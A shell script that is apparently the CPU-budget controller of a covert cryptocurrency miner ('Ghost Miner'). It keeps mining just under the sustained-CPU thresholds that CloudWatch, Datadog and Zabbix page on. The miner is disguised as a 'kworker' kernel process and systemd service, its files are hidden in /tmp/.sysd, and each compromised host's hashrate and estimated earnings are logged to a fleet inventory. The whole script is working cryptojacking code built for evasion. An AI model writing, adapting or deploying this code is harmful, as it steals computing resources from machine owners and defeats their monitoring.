#!/bin/sh
# ============================================================================
# Ghost Miner CPU-budget controller + host capability probe.
#
# Monitoring (CloudWatch, Datadog, Zabbix) pages on *sustained* CPU. So measure
# what the host uses WITHOUT us, then keep the miner inside a budget a fixed
# margin above that line, instead of pinning every core 24/7.
#
#   ./tune.sh         measure, adapt, append one row to fleet.tsv
#   ./tune.sh probe   measure + report only (no state write, no restart)
#
# Env overrides the file, so ad-hoc runs win:
#   CPU_TARGET_PCT   % of all cores we are willing to occupy (default 100)
#   AUTO_TUNE        yes|no, "no" freezes the thread count (default yes)
#   TUNE_WINDOW      seconds per sample (default 5)
#   TUNE_COOLDOWN    minimum seconds between restarts (default 900)
# Leave THREADS="" so this controller owns the thread count.
# ============================================================================
set -eu

SYSDIR="${SYSDIR:-/tmp/.sysd}"
env_target="${CPU_TARGET_PCT:-}"; env_auto="${AUTO_TUNE:-}"
env_win="${TUNE_WINDOW:-}"; env_cool="${TUNE_COOLDOWN:-}"
if [ -r "$SYSDIR/worker.env" ]; then . "$SYSDIR/worker.env"; fi
CPU_TARGET_PCT="${env_target:-${CPU_TARGET_PCT:-100}}"
AUTO_TUNE="${env_auto:-${AUTO_TUNE:-yes}}"
TUNE_WINDOW="${env_win:-${TUNE_WINDOW:-5}}"
TUNE_COOLDOWN="${env_cool:-${TUNE_COOLDOWN:-900}}"
MODE="${1:-apply}"
API="http://127.0.0.1:12701"
STATE="$SYSDIR/threads.local"; STAMP="$SYSDIR/.tune.stamp"; LOG="$SYSDIR/fleet.tsv"

cpu=$(nproc 2>/dev/null || echo 1)
case "$cpu" in ''|*[!0-9]*) cpu=1 ;; esac
hz=$(getconf CLK_TCK 2>/dev/null || echo 100)
case "$hz" in ''|*[!0-9]*) hz=100 ;; esac

miner_pids() { pgrep -f "$SYSDIR/kworker" 2>/dev/null || :; }
busy_jiffies() { awk '/^cpu /{b=0; for(i=2;i<=11;i++) b+=$i; printf "%d", b-($5+$6)}' /proc/stat; }
miner_jiffies() {
    t=0
    for p in $(miner_pids); do
        [ -r "/proc/$p/stat" ] || continue
        v=$(awk '{print $14+$15}' "/proc/$p/stat" 2>/dev/null || echo 0)
        case "$v" in ''|*[!0-9]*) v=0 ;; esac
        t=$((t + v))
    done
    printf '%s' "$t"
}

# one window -> "own_work_cores busy_cores miner_cores util_pct"
sample() {
    b1=$(busy_jiffies); m1=$(miner_jiffies)
    sleep "$TUNE_WINDOW"
    b2=$(busy_jiffies); m2=$(miner_jiffies)
    db=$((b2 - b1)); dm=$((m2 - m1))
    awk -v db="$db" -v dm="$dm" -v hz="$hz" -v w="$TUNE_WINDOW" 'BEGIN{
        cap = hz * w; if (cap < 1) cap = 1
        mine = dm / cap; busy = db / cap
        base = busy - mine; if (base < 0) base = 0
        printf "%.2f %.2f %.2f %.0f", base, busy, mine, busy * 100
    }'
}

# two windows, keep the MIN own-work figure so a cron burst does not move us
s1=$(sample); s2=$(sample)
stats=$(printf '%s\n%s\n' "$s1" "$s2" | awk '
    { if (NR == 1 || $1 < b) b = $1
      if (NR == 1 || $2 > u) u = $2
      if (NR == 1 || $4 > p) p = $4 }
    END { printf "%.2f %.2f %.0f", b, u, p }')
base=$(printf '%s' "$stats" | awk '{print $1}')
util=$(printf '%s' "$stats" | awk '{print $3}')

# budget: a margin above the host's own workload, never more than every core
want=$(awk -v t="$CPU_TARGET_PCT" -v c="$cpu" -v b="$base" 'BEGIN{
    v = t / 100 * c - b
    if (v < 1) v = 1
    if (v > c) v = c
    printf "%d", int(v + 0.5) }')

# ---- report ----------------------------------------------------------------
hps=$(curl -s --max-time 5 "$API/2/summary" 2>/dev/null | awk '
    /"hashrate"/ { h = 1 }
    h && /"total"/ { gsub(/[^0-9. ]/, " "); for (i = 1; i <= NF; i++) if ($i ~ /^[0-9.]+$/) { print $i; exit } }')
[ -n "${hps:-}" ] || hps=0
model=$(grep -m1 'model name' /proc/cpuinfo 2>/dev/null | cut -d: -f2- | sed 's/^ *//;s/ *$//')
[ -n "${model:-}" ] || model=unknown
usd=$(awk -v h="$hps" 'BEGIN { printf "%.3f", h * 0.00011 }')
cur=$(cat "$STATE" 2>/dev/null || :); case "$cur" in ''|*[!0-9]*) cur="" ;; esac

note="hold"
if [ -z "$cur" ]; then note="unset"
elif [ "$want" != "$cur" ]; then note="step $cur -> $want"; fi

echo "host     : ${cpu} core(s), budget ${CPU_TARGET_PCT}% of cores, auto_tune=${AUTO_TUNE}"
echo "cpu      : ${model}"
echo "own work : ${base} core(s) - host is ${util}% busy with us included"
echo "threads  : running=${cur:-none} wanted=${want} (${note})"
echo "hashrate : ${hps} H/s  ~\$${usd}/day at current rates"

[ "$MODE" = probe ] && exit 0

# ---- one inventory row per run --------------------------------------------
[ -f "$LOG" ] || printf 'utc\tcores\tthreads\town_work_cores\tutil_pct\thashrate\test_usd_day\tcpu\n' > "$LOG"
printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
    "$(date -u +%FT%TZ)" "$cpu" "$want" "$base" "$util" "$hps" "$usd" "$model" >> "$LOG"
if [ "$(wc -l < "$LOG")" -gt 1200 ]; then tail -n 600 "$LOG" > "$LOG.new" && mv -f "$LOG.new" "$LOG"; fi

# ---- adapt -----------------------------------------------------------------
case "${THREADS:-}" in ''|*[!0-9]*) manual=no ;; *) manual=yes ;; esac
[ "$AUTO_TUNE" = yes ] || manual=yes
[ "$manual" = no ] || exit 0

now=$(date +%s)
last=$(cat "$STAMP" 2>/dev/null || echo 0); case "$last" in ''|*[!0-9]*) last=0 ;; esac
[ "$want" != "${cur:-none}" ] || exit 0

if [ $((now - last)) -lt "$TUNE_COOLDOWN" ] && [ -n "$cur" ]; then
    echo "tune     : ${want} thread(s) pending, cooldown $((TUNE_COOLDOWN - now + last))s left"
    exit 0
fi
printf '%s\n' "$want" > "$STATE"
printf '%s\n' "$now" > "$STAMP"

# first ever run on an idle box just matches what run.sh already picked
skip=no
if [ -z "$cur" ] && [ "$want" = "$cpu" ] && [ -n "$(miner_pids)" ]; then skip=yes; fi
if [ "$skip" = no ]; then
    if command -v systemctl >/dev/null 2>&1; then
        systemctl restart kworker 2>/dev/null || :
    else
        pkill -f "$SYSDIR/kworker" 2>/dev/null || :
        nohup "$SYSDIR/run.sh" >/dev/null 2>&1 &
    fi
    echo "tune     : restarted miner with ${want} thread(s)"
fi
